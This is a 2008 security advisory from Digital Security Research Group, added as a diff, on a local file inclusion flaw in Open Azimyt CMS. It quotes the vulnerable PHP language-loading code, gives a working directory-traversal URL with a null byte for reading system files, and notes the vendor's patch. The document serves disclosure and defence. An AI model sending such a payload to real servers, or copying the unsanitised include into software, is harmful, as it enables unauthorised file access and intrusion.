@@ -1,0 +1,71 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-026
+
+
+Application:                    Open Azimyt CMS
+Versions Affected:              0.22 minimal, 0.21 stable
+Vendor URL:                     http://azimyt.net/
+Bug:                            Local File Include
+Exploits:                       YES
+Reported:                       07.06.2008
+Vendor Response:                08.06.2008
+Solution:                       YES
+Date of Public Advisory:        16.06.2008
+Author:                         Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+Local File Include vulnerability found in script azimyt/lang/lang-system.php
+
+
+Code
+****
+#################################################
+
+if(isset($_GET['lang'])){
+  $_SESSION['lang']=$_GET['lang'];
+}
+
+if(!isset($_SESSION['lang'])){
+  $_SESSION['lang'] = "second";
+}
+
+if (isset($_SESSION['lang']))
+{
+  $SystemLangFile = $CFG->admin_folder."/lang/lang-system-".$_SESSION['lang'].".php";
+  if(!file_exists($SystemLangFile)) exit(ErrorLang::LangFile_not_load);
+  require($SystemLangFile);
+}
+
+#################################################
+
+
+Example:
+
+http://[server]/[installdir]/azimyt/lang/lang-system.php?lang=../../../../../../../../../../../../../boot.ini%00
+
+
+
+Fix Information
+***************
+
+Vendor fixed this flaw on 10.06.2008. Patch  can be downloaded here:
+
+http://open-azimyt-cms.googlecode.com/files/security_patch.zip
+
+
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:    research [at] dsec [dot] ru
+            http://www.dsec.ru (in Russian)
+
+# milw0rm.com [2008-06-16]
